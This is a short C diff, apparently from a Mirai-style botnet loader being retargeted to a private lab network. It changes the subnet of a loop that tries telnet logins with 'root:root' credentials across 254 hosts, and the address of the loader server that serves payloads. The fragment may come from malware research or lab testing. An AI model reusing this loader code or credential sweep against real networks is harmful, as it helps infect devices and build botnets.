@@ -56,7 +56,7 @@ void auto_scan_lab(void)
     for (int i = 1; i <= 254; i++)
     {
         char strbuf[128];
-        snprintf(strbuf, sizeof(strbuf), "172.31.30.%d:23 root:root", i);
+        snprintf(strbuf, sizeof(strbuf), "172.31.16.%d:23 root:root", i);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
@@ -151,7 +151,7 @@ int main(int argc, char **args)
 
     addrs_len = 1;
     addrs = calloc(addrs_len, sizeof(ipv4_t));
-    addrs[0] = inet_addr("172.16.193.197");
+    addrs[0] = inet_addr("172.31.16.51");
 
     if (argc == 2)
         id_tag = args[1];
@@ -163,7 +163,7 @@ int main(int argc, char **args)
     }
 
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
-                              1024 * 64, "172.16.193.197", 80, "172.16.193.197")) == NULL)
+                              1024 * 64, "172.31.16.51", 80, "172.31.16.51")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
